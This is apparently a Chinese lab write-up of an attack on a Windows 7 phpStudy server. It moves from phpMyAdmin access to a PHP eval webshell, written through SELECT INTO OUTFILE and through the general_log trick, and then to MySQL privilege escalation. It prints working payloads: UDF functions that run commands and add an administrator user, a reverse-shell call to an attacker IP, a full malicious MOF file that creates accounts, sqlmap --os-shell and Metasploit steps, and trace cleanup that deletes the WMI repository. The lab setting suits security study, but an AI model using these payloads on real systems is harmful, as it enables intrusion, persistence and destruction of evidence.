# 环境搭建

靶机:win7

攻击机:win10

Phpstudy搭建的php+mysql

php版本：5.4.45

mysql版本：5.5.53

攻击环境：已知root账号密码，网站存在phpmyadmin页面

# 通过phpmyadmin来getshell

登陆phpmyadmin后，先来看看log变量来推出WWW的绝对路径

![image-20220317164511106](images/1.png)

老版的phpstudy和小皮面板的路径有一些不一样，熟悉的话是知道的，老版的话web目录在phpstudy/PHPTutorial/WWW目录，而小皮面板则是phpstudypro/WWW目录，这里因为是要getshell，所以要找到他的web目录，linux则又有一点不同

知道SQL目录后可以尝试用sql语句来写shell

```
select '<?php @eval($_POST[1]);?>' INTO OUTFILE 'C:/phpstudy/PHPTutorial/WWW/shell.php'
```

![image-20220317164914201](images/2.png)

报错了，这里不能使用INTO OUTFILE，因为file_priv是null，MYSQL新特性secure_file_priv对读写文件的影响，此开关默认为NULL，即不允许导入导出，而且在这里我们是没有权限修改这个参数的

![image-20220317165023319](images/3.png)

secure-file-priv的值有三种情况

```
secure_file_prive=null       限制mysqld不允许导入导出
secure_file_priv=/path/      限制mysqld的导入导出只能发生在默认的/path/目录下
secure_file_priv=''        不对mysqld的导入导出做限制
```

看师傅的文章学到了利用日志来写shell

首先开启日志记录，这是有权限执行的

```
set global general_log='on';
```

把日志文件导出到指定目录

```
set global general_log_file='C:/phpstudy/PHPTutorial/WWW/shell.php';
```

这里用SQL语句执行一个一句话木马，日志会记录

```
select '<?php @eval($_POST[1]); ?>';
```

最后关闭日志

```
set global general_log=off;
```

然后用蚁剑连接即可

![image-20220317165947248](images/4.png)

接下来就开始对mysql进行提权

# MYSQL提权

## UDF提权

UDF(user-defined function)是MySQL的一个拓展接口，也可称之为**用户自定义函数**，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便

对于UDF提权的一些介绍，引用原文师傅的话

### 动态链接库

动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用

### 提权分析

udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权

### 提权过程

对于UDF提权，有三种方法

```
手工UDF提权
利用sqlmap进行UDF提权
利用msf来UDF提权
```

#### sqlmap进行UDF提权

先解决一个不能直连数据库的问题

```
1.git clone https://github.com/petehunt/PyMySQL/
2.cd PyMySQL/
3.python setup.py install
```

UDF提权

```
sqlmap -d "mysql://root:root@192.168.121.130:3306/mysql" --os-shell
```

不过这种方法前提是在数据库用户可以外联的情况下才能使用，secure_file_priv需要为空，不能为null

![image-20220317225229519](images/5.png)

![image-20220317225240268](images/6.png)

在创建了os-shell后运行命令未成功，查看是dll文件没有上传到plugin目录

因为这里我是phpstudy运行的，后面才知道居然是32位的，用32位的提权成功

![image-20220317234948222](images/7.png)



#### 手工UDF提权

手工提权又有几种操作

##### 利用暗月的木马提权

链接在这个页面https://www.ancii.com/aef83qj55/

![image-20220317225812825](images/8.png)

利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求

- Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。
- Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下

但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建，利用获取到的shell创建一个plugin目录，不然是上传不了的

不过这里创建后还是不能直接上传是因为secure_file_priv为null的原因我们不能直接导出udf.dll

这个字段在my.ini里面，但是用phpstudy搭建的并没有，默认为null，所以我们只有自己添加一个这个字段

![image-20220317230926622](images/9.png)

修改后记得用命令行重启一下MySQL

![image-20220317230842055](images/10.png)

除此之外，可以直接用对于版本的MySQL做好的dll上传上去

不过这个udf文件一直报错

![image-20220317231901501](images/11.png)

有的可能会遇到这种错误：`ERROR 1126 (HY000): Can't open shared library 'lib_mysqludf_sys.dll' (errno: 193 )`，这里其实有个小坑的，我用的是phpstudy的mysql，phpstudy可能因为用的是32位的mysql所以这里要使用32位的动态链接库，还有一个地方要注意的是mysql5.1版本之前的插件目录默认在根目录下，5.1之后在lib\目录下，如果动态链接库没放对目录就会出现：`Can't find symbol 'sys_eval' in library`错误

换成32位的动态链接库就OK了

![image-20220317233338021](images/12.png)

能够成功执行

##### 手工直接上传动态链接库

在sqlmap中自带动态链接库sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_

不过这是加密文件，要使用sqlmap自带的cloak.py工具进行解密才能用，在sqlmap/extra目录下

```
python cloak.py -d -i C:\Python27\sqlmap\data\udf\mysql\windows\32\lib_mysqludf_sys.dll_
```

![image-20220317233714376](images/13.png)

生成了应该应用程序扩展就是我们要用到的，这里应该用32位的udf文件

接下来执行sql语句创建sys_exec或者sys_eval函数

![image-20220317233958378](images/14.png)

```
create function sys_eval returns string soname "lib_mysqludf_sys.dll";
```

```
函数介绍：

sys_eval，执行任意命令，并将输出返回。
sys_exec，执行任意命令，并将退出码返回。（但是不会有回显）
sys_get，获取一个环境变量。
sys_set，创建或修改一个环境变量。
一般用于创建新用户维持权限

命令介绍

create function cmdshell returns string soname 'moonudf.dll' 【创建cmdshell】
select cmdshell('net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add')   【添加超级管理员】
select cmdshell('net user')  【查看用户】
select cmdshell('netstat -an')  【查看端口】
select name from mysql.func   【查看创建函数】
delete from mysql.func where name='cmdshell'  【删除cmdshell】
create function backshell returns string soname 'moonudf.dll' 【创建反弹函数】
select backshell('192.168.157.130',12345)    【执行反弹】
delete from mysql.func where name='backshell'  【删除backshell】
```

#### 利用msf来UDF提权

适应于5.5.9以下

因为mysql的udf提权都是需要上传一个dll文件的，但是如果secure_file_priv为null话就不能直接上传的，所以以后拿到shell后，我们可以在mysql的my.ini里面先修改这一项，然后重启mysql

在windows下

```
1.启动：输入 net stop mysql

2.停止：输入 net start mysql

windows下不能直接重启(restart)，只能先停止，再启动。
```

在linux下

```
两种方法

1、使用 service 启动：service mysql restart

2、使用 mysqld 脚本启动：/etc/inint.d/mysql restart
```

首先先远程登陆mysql

```
mysql -u root -p -h 192.168.121.130
```

![image-20220321184029404](images/15.png)

可以看到现在并没有创建的sys_eval函数

利用msf的multi/mysql/mysql_udf_payload模块来udf提权![image-20220321190141237](images/16.png)

然后再看创建的func

![image-20220321190212383](images/17.png)

这里的dll文件的名称是msf随机的，但是值创建了exec函数，这个函数是没有回显的

![image-20220321190348147](images/18.png)

所以我们再创建一个有回显的sys_eval

```
create function sys_eval returns string soname 'fnZwwVdE.dll';
```

![image-20220321190548678](images/19.png)

![image-20220321190608455](images/20.png)

#### 利用MDUT进行UDF提权

使用文档：https://www.yuque.com/u21224612/nezuig/zi2b1b

安装教程也在里面

使用此软件需要的java版本为1.8，亲自尝试java11无法运行此jar包

![image-20220321230639176](images/21.png)

直接点击UDF即可提权，然后反弹shell也可以

![image-20220321230826236](images/22.png)

这里写backshell函数后面也会提到

但是在最后痕迹清理的时候会有残留文件

![image-20220321230927996](images/23.png)

## MOF提权

### MOF文件

托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。

### 提权原理

MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权

### 提权条件

```
windows 03及以下版本
mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录
secure-file-priv参数不为null
```

mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了

其实这里也有三种提权方式，可以参考https://xz.aliyun.com/t/7392#toc-9，因为我没有再去找那个mof.php文件了，而且这里需要windows 03我并没有去搭建，主要就记录一下这个提权方式的过程

### 上传nullevt.mof文件进行MOF提权

nullevt.mof文件源码

```
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name = "filtP2";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user DawnT0wn 123456 /add\")";
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};
```

利用这个文件每五秒创建来创建一个新的user为DawnT0wn的用户

因为能够连接到MySQL，直接执行如下命令

```
select load_file("D:/nullevt.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
```

这里直接把我D盘的nullevt.mof上传到其目录下

注意这里不能使用`outfile`，因为会在末端写入新行，因此`mof`在被当作二进制文件无法正常执行，所以我们用`dumpfile`导出一行数据

将创建的用户加入administrator

```
net.exe user localgroup administrator DawnT0wn /add\
```

因为这个每5s就会创建一个新的用户，所以我们要想办法抹去痕迹

```
net stop winmgmt
net user DawnT0wn /delete
del c:/windows/system32/wbem/repository
net start winmgmt
```

## Mysql反弹端口提权

其实这也是udf提权的一种方式

- 我们所使用的这个udf.dll是被定制过的，其中定义了以下函数
- 部分函数说明：
  1. cmdshell：执行cmd
  2. downloader：下载者，到网上下载指定文件并保存到指定目录
  3. open3389：通用开3389终端服务，可指定端口（不改端口无需重启）
  4. backshell：反弹shell（本次文章主角）
  5. ProcessView：枚举系统进程
  6. KillProcess：终止指定进程
  7. regread：读注册表
  8. regwrite：写注册表
  9. shut：关机、注销、重启
  10. about：说明与帮助函数

但是他这里的定制的udf.dll需要自己去写，所以会有很长的exp，在附件里面，另外暗月的木马我也会通过附件发出来

主要还是连接上了mysql或者phpmyadmin执行SQL语句

只是在创建函数的时候执行了应该反弹shell的backshell函数

但是这里我执行sql语句的时候并没有把内容写到udf.dll，所以我就直接用winhex做了这个udf.dll上传

![image-20220321212552919](images/24.png)

```
create function backshell returns string soname 'udf.dll';
```

执行`select backshell('192.168.121.129',4444);`反弹shell来提权

![image-20220321213128744](images/25.png)



参考链接

https://blog.csdn.net/qq_45300786/article/details/117202412

https://xz.aliyun.com/t/10373#toc-3

https://xz.aliyun.com/t/7392#toc-0

https://xz.aliyun.com/t/2719#toc-14

https://www.yuque.com/u21224612/nezuig/zi2b1b